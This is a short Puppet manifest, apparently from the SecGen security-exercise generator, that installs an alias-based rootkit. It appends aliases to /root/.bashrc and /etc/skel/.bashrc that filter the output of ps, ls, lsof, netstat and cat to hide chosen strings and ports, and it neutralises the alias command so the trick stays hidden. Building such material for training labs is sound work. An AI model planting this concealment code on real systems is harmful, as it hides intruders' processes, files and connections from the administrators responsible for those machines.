class alias_rootkit::install {

  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
  $hidden_ports = join($secgen_parameters['hidden_ports'], "\|")
  $hidden_strings = join($secgen_parameters['hidden_strings'], "\|")

  $aliases = "alias ps='f(){ ps \"$@\" |grep -v \"$hidden_strings\"; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v \"$hidden_strings\" |column -c 80; unset -f f; }; f'; alias lsof='f(){ lsof \"$@\" |grep -v \"$hidden_strings\"; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v \"$hidden_strings\|$hidden_ports\"; unset -f f; }; f'; alias cat='f(){ cat \"$@\" |grep -v \"$hidden_strings\|alias\"; unset -f f; }; f'; alias alias='true'"

  file_line { 'Append a line to /etc/skel/.bashrc':
    path => '/etc/skel/.bashrc',
    line => $aliases,
  }
  file_line { 'Append a line to /root/.bashrc':
    path => '/root/.bashrc',
    line => $aliases,
  }

}
